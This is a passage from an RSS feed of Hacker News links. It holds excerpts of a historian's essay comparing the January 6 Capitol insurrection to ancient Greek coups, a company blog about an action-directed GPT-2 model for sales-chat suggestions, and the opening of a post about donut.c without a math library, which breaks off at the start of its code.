Score 13 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25787594">thread link</a>) | @parsecs
<br/>
January 14, 2021 | https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>So this week I want to talk about how what I know a historian influences how I am interpreting what I am going to call the Capitol Insurrection that happened on Wednesday, January 6 instead of taking the week off as I had originally planned. Since that is a really heavy topic, I am also going to do what I was <em>originally </em>planning to do this week,<strong> which was to share pictures of the two adorable little cats the Pedant-Household has adopted.</strong></p>



<p>They are named Oliver and Percival (Oliver after the knight from <em>The Song of Roland</em> and Percival after the knight from Arthurian legends, particularly Chretien de Troyes), and they are super-friendly and also oppose insurrectionists.</p>



<figure><img data-attachment-id="5936" data-permalink="https://acoup.blog/pxl_20210114_215722402/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg" data-orig-size="4032,3024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610643442&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;1117&quot;,&quot;shutter_speed&quot;:&quot;0.041667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="pxl_20210114_215722402" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210114_215722402.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Oliver (left) and Percival (right) seen here occupying the Pedant’s <a href="https://acoup.blog/category/fireside/">Fireside Chair</a>.</figcaption></figure>



<p>(Note that I have turned off comments for this post.  I know we all have opinions on this, often very strong opinions that others might find very frustrating.  I don’t particularly want to moderate that discussion and in any event, you are, at this point, much better off (if you are in the United States) <a href="https://youtu.be/KXXYkLa-HHI">Contacting Your Representatives</a> with your opinion, rather than arguing on the internet.)</p>



<p>We already talked, <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/">back in October</a>, about civil strife – <em>stasis</em> – in Greek communities and about how I thought that the United States has found itself in the early but accelerating stages of <em>stasis</em> as described by ancient Greek writers (I also worked in some Roman examples, but I really think the Greek parallel is more useful, as the fall of the Roman Republic was so heavily influenced by the involvement of the Roman Army; the United States military has played no such role, nor indicated it is interested in doing so.  For now, the civil-military relationship remains relatively healthy).</p>



<p>I’m going to assume you have all of that already, so if you want to go back and look at how I described <em>stasis</em> and what that meant, you may want to do that first.  Instead, I want to move forward and discuss what thinking in terms of <em>stasis</em> means in understanding the Capitol Insurrection and in particular the relevance of that Greek model of <em>stasis</em> in understanding both what has happened and what may need to happen going forward.  Starting with:</p>



<h2>This Was Serious</h2>



<p>While the insurrection was happening and in its immediate aftermath, there was a tendency to focus on the more frivolous, silly parts of it.  And there were truly silly looking things.  And there are still commentators – some deluded, some acting in bad faith – attempting to insist that this wasn’t serious.  <strong>They are wrong; the Capitol Insurrection was deadly serious</strong> both in the very literal sense that <em>people died</em> (which I think seems to be missed in some quarters), but also for what it means.  And, as time has passed and <a href="https://www.washingtonpost.com/dc-md-va/2021/01/14/dc-police-capitol-riot/?arc404=true">more reporting has been done</a> on <a href="https://twitter.com/CalebJHull/status/1348334770103660553">what was happening</a>, it has become increasingly apparent that we were perhaps <em>moments </em>away from mass-casualty events (either where politicians were taken by the mob or where the mob so endangered law enforcement or politicians that lethal force was required that would have left many insurrectionists dead).</p>



<p><strong>No ancient Greek would have had any trouble in understanding what happened on the 6th or that it was a serious attempt</strong> (albeit an incompetent one) <strong>to seize power</strong>.  Having a leader or a political faction move with a mob (often armed, but not always so) to<strong> try to disperse the normal civic assemblies of a Greek <em>polis</em> and occupy their normal meeting place was a standard maneuver to try to seize power during <em>stasis</em></strong>. As Dr. <a href="https://twitter.com/Roelkonijn">Roel Konijnendijk</a>, an ancient Greek history specialist, noted in this <a href="https://www.reddit.com/r/AskHistorians/comments/ks082p/meta_todays_sedition_at_the_united_states_capitol/giexmxe/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">excellent discussion</a> on the r/AskHistorians reddit (where he posts as Iphikrates), “In the Greek world, most attempts to seize power by force tended to take the same form: the seditious party would contrive an opportunity to gather in arms while their opponents were unarmed and off-guard, and seize control of all public spaces.”</p>



<p><strong>To take merely the examples in Athens</strong>, Cylon (the ‘c’ is hard, so Ki-lon – or if you prefer the Greek, Ku-lon – not Psi-lon) attempted it in 632, trying to seize the Athenian Acropolis with an armed mob (Thuc. 1.126; Hdt. 5.71; Plut. <em>Sol.</em> 12.1-2). Cylon’s effort failed in appropriately tragicomic fashion, with his supporters seeking shelter in the temple of Athena and only coming out with a cord that connected them to the altar and its notional protection (the cord breaks and they are all slain, Plut. <em>Sol</em>. 12).  Peisistratos also did it that way in Athens in 561 (Hdt. 1.59) using handpicked bodyguard that he armed with clubs, rather than spears; I cannot help but note just how many things we saw being used as clubs on the 6th. After the Pesistratids were thrown out, Isagoras attempted (with support from the Spartan king Cleomenes I) to institute an oligarchy the same way, seizing the Acropolis, but failing to take the Athenian <em>agora</em>; the Athenians rallied under the democratic leader Cleisthenes and besieged Cleomenes and Isagoras on the Acropolis (Hdt. 5.72; Arist. <em>Ath. Pol</em>. 20.1-4). Later in 411, the ‘Four Hundred’ would seize power in exactly the same way, arriving with a mob of armed supporters to disperse the Athenian <em>boule</em> – it’s council (Thuc. 8.69).  <strong>That’s four examples of this exact tactic from Athens alone</strong> (Athens was by no means the most <em>stasis</em>-prone ancient state, by the way – that was almost certainly Syracuse).</p>



<p>Moreover, <strong>One thing about coup attempts like this in the ancient world: they all look farcical, unless they work.</strong>  Peisistratos’ band of club-armed bodyguards would have looked terribly silly, except that they succeeded, for a time (put a pin in that, we’ll come back to it).  Peisistratos’ second attempt actually built support with something about as farcical as the <a href="https://www.bbc.com/news/world-us-canada-55606044">Q-Anon Shaman</a>, by riding into Athens on a chariot accompanied by a particularly tall woman dressed as Athena (Hdt. 1.60.2-5); the demonstration was taken by some as a sign of divine support. One assumes many Athenians thought it was laughable (Herodotus certainly does), but it was the precursor to another effort to seize power which also worked, albeit temporarily.</p>



<p>Just because it looks silly doesn’t mean it can’t work.  <strong>This was very serious</strong> and <strong>anyone pretending that ‘censorship’ on Twitter</strong> (a <em>private</em> platform, I thought these folks believed in markets?) <strong>or mean – but true – words from angry politicians is more consequential <em>than the violent attempt to seize the seat of government</em> is either a fool, an enemy, or both</strong> (though I will note that there is a world of difference between ‘fools’ and ‘enemies’ – fools may be persuaded and doing so is essential, see below.  We are all foolish at times; it is the cynics that get my dander up).</p>



<figure><img data-attachment-id="5938" data-permalink="https://acoup.blog/pxl_20210110_223238849-mp_/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg" data-orig-size="4032,3024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3a&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610299958&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;1919&quot;,&quot;shutter_speed&quot;:&quot;0.066683&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="pxl_20210110_223238849.mp_" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=2048 2048w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2021/01/pxl_20210110_223238849.mp_.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Oliver, acting as my loyal research assistant.</figcaption></figure>



<h2>This Is Not Over</h2>



<p>Let’s come back to Peisistratos, because he is instructive here.  Peisistratos tried to make himself tyrant of Athens <em><strong>twice</strong></em> before his third attempt succeeded. We’ve discussed his <strong>first attempt </strong>above (in 561), where Peisistratos attempted to use a club-armed bodyguard to seize the city (Hdt. 1.59); that worked, but he was overthrown in a counter-coup sometime after (Hdt. 1.60.1; this was not immediately though, Herodotus notes that Peisistratos had time to set government affairs, Hdt. 1.59.6).</p>



<p><strong>For the <em>second</em> attempt </strong>in 559, Peisistratos made a key alliance with Megacles – someone we might term an ‘establishment’ figure in the Athenian politics of the day, looking to get the edge on his rivals in the continuing Athenian <em>stasis</em> (Herodotus uses the very word, I should note). He was then brought into the city (the chariot bit above, Hdt. 1.60.2-5) and seized power <em>again</em>, with a mob of his supporters. This effort ends because Peisistratos offends Megacles and once his ally turns on him, he is exiled again (Hdt. 1.61.1-2).</p>



<p>But that wasn’t the end of the matter. Peisistratos, once out of power again used his wealth and support – often foreign support, we are told – to raise an army, hire mercenaries (Argives, Herodotus reports) and rally his supporters before storming back into Athens in 545 (Hdt. 1.16.3-4). Herodotus notes that a great flock of Peisistratos’ partisans from the city swarmed out to support him (this should sound more than a little familiar) and<strong> with that mix of mercenaries and mob he was able to catch the Athenians unprepared</strong> (Hdt. 1.63.1) and scattered them, then used a mix of misinformation (implying he intended no violence, Hdt. 1.63.2) and speed to seize the key parts of the city to keep the Athenians disorganized. And then he murdered or exiled all of his enemies (Hdt. 1.64.3) because that is what tyrants <em>do</em>, whatever they are assuring you about their peaceful intentions ahead of time. People who seize power with violence instead of with votes do not suddenly become pacifists when they win!</p>



<p>I don’t know what form the continuation of the trends that led to the Capitol Insurrection will take, if there will be further attempts at violent disruption in D.C. itself, or if we’ll see a shift to a campaign of domestic terror (something like <a href="https://en.wikipedia.org/wiki/The_Troubles">The Troubles</a>, in terms of the violence committed), or if, as with the Nazis after the failure of the <a href="https://en.wikipedia.org/wiki/Beer_Hall_Putsch">Beer Hall Putsch</a>, the folks who supported this insurrection will focus on trying to use the democratic process to abolish the democratic process.  <strong>But this is not over</strong>.  There is abundant polling evidence that among a minority of Americans (but a plurality or majority of Republicans; we’ll come back to that) support for the lies (that the election was fraudulent, <em><a href="https://factcheck.thedispatch.com/p/fact-check-debunking-donald-trumps">which it wasn’t</a></em>; the liars were <a href="https://beta.documentcloud.org/documents/20423518-trump_case_decision">given plenty of chances to provide any evidence at all</a> for their lies and they didn’t) remains high.  As in 545, a great many Americans still support Peisistratos.  Some smaller subset of them have bought into messianic conspiracy theories like Q-Anon which fairly transparently could lead to considerable violence. <strong> The underlying conditions that made the tyrannical attempt possible still exist</strong>, so we should expect …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/">https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787594</guid>
            <pubDate>Fri, 15 Jan 2021 06:12:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Large language models are wild, but can you control them?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25787553">thread link</a>) | @strin
<br/>
January 14, 2021 | https://cresta.com/blog/action-directed-gpt-2 | <a href="https://web.archive.org/web/*/https://cresta.com/blog/action-directed-gpt-2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>At Cresta, we empower sales and support agents that talk to their customers over chat to become experts on day one. We do that by providing them real-time suggestions about how they should respond to their customers. The suggestions as shown in the image below are fully formed responses that can either be sent directly or after light editing by the agents.</p>
<figure id="attachment_19262" aria-describedby="caption-attachment-19262"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/d3c7caf02b9a1ab5f6701f8ccd10d325078eb4f7/f9016/static/c9c87ceb0c53cb006de480b937669d61/gpt-2.png" alt="" width="619" height="350" srcset="https://d33wubrfki0l68.cloudfront.net/d3c7caf02b9a1ab5f6701f8ccd10d325078eb4f7/f9016/static/c9c87ceb0c53cb006de480b937669d61/gpt-2.png 619w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034053/gpt-2-300x170.png 300w" sizes="(max-width: 619px) 100vw, 619px"><figcaption id="caption-attachment-19262">Agents can choose to respond with these generated suggestions.</figcaption></figure>
<p>By suggesting great responses, we help sales agents sell more and help support agents resolve issues quickly. These suggestions also make agents more efficient by saving them a lot of time from manually typing responses.</p>
<p>With this blog, we would like to share an exciting new machine learning model we designed and deployed in early 2020, to generate these expert suggested responses which have driven improvements in sales conversion for our customers</p>
<p>But before introducing the new model, let’s understand the general problem we are trying to solve by focusing on the domain of sales.</p>
<h2>ML for Sales Conversations</h2>
<p>When a sales representative joins a new company, they spend about 6 months learning the ropes and gaining experience until becoming completely effective in their roles. Traditionally, the agents are coached by a sales leader who would listen to conversations and jump in at the right moment to guide the representative. The sales leader may tell the agent to take actions like “Ask for a sale”, “Discover customer’s needs”, “Greet the customer” etc. In the context of live chat, it’s valuable to have a real-time coach to guide responses.</p>
<p>Cresta’s platform helps to solve this training problem by creating individualized responses for each agent. At appropriate moments in the conversation, sales agents can use these suggestions to answer customer inquiries more quickly and more effectively. Our models analyze the ongoing sales conversation to understand the situation, and then suggest the next best response to say according to the next best action to take.</p>
<h2>Language Models for Dialog</h2>
<p>The problem of generating the next response can be solved by training a language model on a dataset of conversations. When we represent dialog as text, we can train a language model on that text and then ask the language model to generate the probable next response given an in-progress conversation. In practice, we have seen that this method works well as pre-trained language models have become very powerful in the past 2 years. These language models usually generate coherent responses.</p>
<p>But just generating coherent responses is not enough. We also want the system to generate the best response to reach the goal of successfully converting a sale. However, a major problem with such language models is that they are difficult to control. This means that it is hard to ask the model to generate a certain type of response.</p>
<p>Now, for example, imagine Alice and Bob are having a conversation…</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/bcb41bae9d573eb45ecb5663834db24784e8cd1a/0f1e7/static/c6ff145ede3bf02bcce9ee10ebcece3e/gpt-2-1.png" alt="" width="2000" height="996" srcset="https://d33wubrfki0l68.cloudfront.net/bcb41bae9d573eb45ecb5663834db24784e8cd1a/0f1e7/static/c6ff145ede3bf02bcce9ee10ebcece3e/gpt-2-1.png 2000w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-300x149.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1024x510.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-768x382.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1536x765.png 1536w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1200x598.png 1200w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1980x986.png 1980w" sizes="(max-width: 2000px) 100vw, 2000px"></p>
<p>All the possible responses by Bob are valid responses that a language model might generate. These responses correspond to different actions that Bob might take. We want to control language models to generate responses that help Bob achieve his goal, whatever that might be.</p>
<h2>Need for Controlling language models</h2>
<p>At Cresta, the language model is trained on the real chats of agents, and we find that different agents respond differently to the same situation. We also find that not every agent in a conversation answers perfectly. All this leads to high variance and noise in the training dataset. Thus from this dataset, the model learns a wide distribution of the next possible responses. Since the trained model is more uncertain about the next response, it becomes hard for the model to generate the best response reliably.</p>
<p>In the field of sales, agents use a call-flow which describes what sequence of actions they ideally need to make to get the sale. The best next action for instance could be to ask to close a sale during an appropriate opportunity. To improve the probability of agents making a successful sale, we also want our models to generate a response according to the best next action in that situation. Certainly, a model that generates text that is all over the place won’t suffice.</p>
<p>With our analysis, we also verified that when agents follow the best sequence of actions, it leads to significantly higher sales as shown in the analysis below.</p>
<figure id="attachment_19258" aria-describedby="caption-attachment-19258"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/9f56b1d58e734c358b3bc279a70a3065ee0db37d/3362f/static/d1eb97d18515af49c082d840a5178c91/gpt-2-2.svg" alt="" width="600" height="371"><figcaption id="caption-attachment-19258">For the chats by expert agents that converted in sales, we see that they largely follow the call-flow. e.d. means edit distance of the real conversation from the call-flow. For example, e.d. of 1 means that the agent deviated by 1 action from the call-flow.</figcaption></figure>
<figure id="attachment_19256" aria-describedby="caption-attachment-19256"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/e9435e03b89fca5e74dba02bc22d9bf142bf13b8/ca507/static/cbc474416957f16a7790ed95e2d180e9/gpt-2-3.svg" alt="" width="600" height="371"><figcaption id="caption-attachment-19256">For the chats by all the agents that did not convert in a sale, we see that they deviate strongly from the call-flow.</figcaption></figure>
<p>Instead of relying on training with a maximum likelihood objective to maximize the probability of the next token in the training corpus [1], we want to generate goal-directed responses following a call-flow that maximizes the business metric of sales conversion.</p>
<p>To solve this problem, we designed a controllable language model called “Action-directed GPT-2.”</p>
<h2>Action Directed GPT-2</h2>
<p>Since we want sales agents to follow a call-flow that defines the best sequence of actions they need to make to make a sale, we also want the suggestions to follow that call-flow.</p>
<p>We break the problem of suggestions following a call-flow into two parts-</p>
<ol>
<li>Predict the next best action.</li>
<li>Generate a good response for that action.</li>
</ol>
<p>A typical classical dialog state tracking system also follows a similar architecture where it uses a dialog policy to predict the next action and then selects the response based on a template. According to our experience, such a system does not work well because the real-world conversations are too complex to model with a finite number of states. Even if we were to model the states correctly, the text generations from a template would seem robotic and would not be contextually adapted to the current conversation. These reasons lead to low usage of such suggestions by the sales agents.</p>
<p>To successfully generate contextually accurate responses that follow the correct next action, we train GPT-2, [2] a large language model, to model the problem as learning the probability of the next response given the current state of the conversation and the next best action. This is represented in the figure below.</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/5f52a28a7ef6881f6510f74ee2e91b0033447833/a26ee/static/ae3a505a7381edcead0e7f4136248f55/gpt-2-4.png" alt="" width="1690" height="836" srcset="https://d33wubrfki0l68.cloudfront.net/5f52a28a7ef6881f6510f74ee2e91b0033447833/a26ee/static/ae3a505a7381edcead0e7f4136248f55/gpt-2-4.png 1690w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-300x148.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-1024x507.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-768x380.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-1536x760.png 1536w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-1200x594.png 1200w" sizes="(max-width: 1690px) 100vw, 1690px"></p>
<h2>Data representation for Action Directed GPT-2 model</h2>
<p>There are multiple possible approaches for feeding the action information to the model. This includes adding an extra embedding layer to GPT2 which learns an action-dependent embedding that represents the action a message performs. Although through experimentation, we discovered that representing actions inline as text resulted in a model that is easier to work with, which also performs very well.</p>
<p>Following is an example of the textual representation on a hypothetical chat with hypothetical actions. Over here, the text in <strong>bold</strong> is the action label for the following message.</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/72cd822bf8646fe7d012f515bbedb50ed12923dc/f9666/static/03c99690032af316c57d1a672e5990a4/gpt-2-4-1.png" alt="" width="1295" height="583" srcset="https://d33wubrfki0l68.cloudfront.net/72cd822bf8646fe7d012f515bbedb50ed12923dc/f9666/static/03c99690032af316c57d1a672e5990a4/gpt-2-4-1.png 1295w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034746/gpt-2-4-1-300x135.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034746/gpt-2-4-1-1024x461.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034746/gpt-2-4-1-768x346.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034746/gpt-2-4-1-1200x540.png 1200w" sizes="(max-width: 1295px) 100vw, 1295px"></p>
<h2>Training and inference</h2>
<p>With this representation, we require action labels for messages in the training set and since there can be millions of such messages, it is not feasible to label them manually. We instead use action classification models to label agent messages in the entire training set with their corresponding actions. The messages can also be classified as no action performed, and there is no inline action label for such a case. When all the training set chats are annotated, we use the resulting text representation to train a standard GPT-2 model. GPT-2 being a causal language model, learns to map an action to its associated agent message. Training with a standard language modeling loss function and gradient descent results in the model automatically learning the relationship of the next response to the action and the chat context.</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/5c531c8018ec95755a7908f0d61cfdf0a3b6e963/7367e/static/a1723095918f2185bb406593b14f4a63/gpt-2-5.png" alt="" width="1321" height="306" srcset="https://d33wubrfki0l68.cloudfront.net/5c531c8018ec95755a7908f0d61cfdf0a3b6e963/7367e/static/a1723095918f2185bb406593b14f4a63/gpt-2-5.png 1321w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034044/gpt-2-5-300x69.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034044/gpt-2-5-1024x237.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034044/gpt-2-5-768x178.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034044/gpt-2-5-1200x278.png 1200w" sizes="(max-width: 1321px) 100vw, 1321px">With this trained Action Directed GPT-2 model, given an in-progress chat and next action, we can now generate the next response which would be contextualized and follow the next action. During inference time, we take the current state of the chat, annotate each agent message with its action, take the next best action prediction of the next agent action model and convert it all to a text representation. Once we know the next action to take, there is no significant time penalty during generation so the model also demonstrates high inference performance when deployed. If the next action prediction model does not predict any action, the action directed GPT-2 model falls back to a standard language model generating a response without any action direction.</p>
<figure id="attachment_19250" aria-describedby="caption-attachment-19250"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/b10af5324f0d073c3c144bdc474936f656284493/46fdb/static/8eefb8b0eaf41e7685db2f120829fba5/gpt-2-6.png" alt="" width="2000" height="458" srcset="https://d33wubrfki0l68.cloudfront.net/b10af5324f0d073c3c144bdc474936f656284493/46fdb/static/8eefb8b0eaf41e7685db2f120829fba5/gpt-2-6.png 2000w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-300x69.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-1024x234.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-768x176.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-1536x352.png 1536w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-1200x275.png 1200w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-1980x453.png 1980w" sizes="(max-width: 2000px) 100vw, 2000px"><figcaption id="caption-attachment-19250">Inference with Action Directed GPT-2</figcaption></figure>
<p>On a test set, we observe that the generations when provided with a model’s prediction of the next best action significantly improves the ability of the model to generate responses that follow the call flow.</p>
<figure id="attachment_19248" aria-describedby="caption-attachment-19248"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/bd96f5e14a8d9988cc0a4bc5cf13ef20e1dbeb39/d02ac/static/b163ddcfe338ae4fb6dbc7678a6ce2dc/gpt-2-7.png" alt="" width="1186" height="742" srcset="https://d33wubrfki0l68.cloudfront.net/bd96f5e14a8d9988cc0a4bc5cf13ef20e1dbeb39/d02ac/static/b163ddcfe338ae4fb6dbc7678a6ce2dc/gpt-2-7.png 1186w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034040/gpt-2-7-300x188.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034040/gpt-2-7-1024x641.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034040/gpt-2-7-768x480.png 768w" sizes="(max-width: 1186px) 100vw, 1186px"><figcaption id="caption-attachment-19248">We observe that when provided the next action labels, the Action directed GPT-2 model generates significantly better responses that are on the call-flow. These BLEU scores are measured per action categories.</figcaption></figure>
<p>We also see that the generations by Action Directed GPT-2 follow the next best action whereas Vanilla GPT-2 generations don’t necessarily follow the next best actions and generate suggestions that are all over the place.</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/38b1fe0e743fe39bd52bf0305ef46b7028783b71/57dd6/static/6261bee883679e6a559c207617ea8582/gpt-2-8.png" alt="" width="1189" height="455" srcset="https://d33wubrfki0l68.cloudfront.net/38b1fe0e743fe39bd52bf0305ef46b7028783b71/57dd6/static/6261bee883679e6a559c207617ea8582/gpt-2-8.png 1189w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034039/gpt-2-8-300x115.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034039/gpt-2-8-1024x392.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034039/gpt-2-8-768x294.png 768w" sizes="(max-width: 1189px) 100vw, 1189px"></p>
<p>After deploying the model to our customers, we found that responses generated by the Action directed GPT-2 help the agents follow the best call flows increasing our customer’s most important sales metrics.</p>
<h2>Conclusion</h2>
<p>The exciting discovery for us was to discover how simple it is to take an off-the-shelf pre-trained language model and make it controllable without changing anything about the underlying model architecture. If you take a standard pre-trained model and finetune it on a noisy dataset, you can still make the model follow perfect behavior by directing the model correctly during runtime.</p>
<p>Since it is very simple to apply this to any new problems that require …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cresta.com/blog/action-directed-gpt-2">https://cresta.com/blog/action-directed-gpt-2</a></em></p>]]>
            </description>
            <link>https://cresta.com/blog/action-directed-gpt-2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787553</guid>
            <pubDate>Fri, 15 Jan 2021 06:02:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Donut.c Without a Math Library]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25787545">thread link</a>) | @robin_reala
<br/>
January 14, 2021 | https://www.a1k0n.net/2021/01/13/optimizing-donut.html | <a href="https://web.archive.org/web/*/https://www.a1k0n.net/2021/01/13/optimizing-donut.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    


    <div role="main">
      <div>
        

<article>
  <p>My little <a href="https://www.a1k0n.net/2011/07/20/donut-math.html">donut.c</a> has
 been making the rounds
again, after being featured in a couple YouTube videos (e.g., <a href="https://www.youtube.com/watch?v=DEqXNfs_HhY">Lex
Fridman</a> and <a href="https://www.youtube.com/watch?v=sW9npZVpiMI">Joma
Tech</a>).  If I had known how much
attention this code would get over the years, I would have spent more time on
it.</p>

<p>One thing that’s always been sort of unfortunate is the heavy use of <code>sin</code> and
<code>cos</code> – both because it necessitates linking the math library (<code>-lm</code>), but
also because it makes it much more CPU-intensive than it really needs to be.
This is especially apparent if you try to port it to an <a href="https://twitter.com/chainq/status/1297178062937825280">older
CPU</a> or an <a href="https://twitter.com/enjoy_digital/status/1341095343816118272">embedded
device</a>.</p>

<p>So, here’s a revised version with no use of <code>sin</code>, <code>cos</code>, and no need for
linking the math library (though this version still does use <code>float</code> types).</p>

<div><div><pre><code>             i,j,k,x,y,o,N;
         main(){float z[1760],a
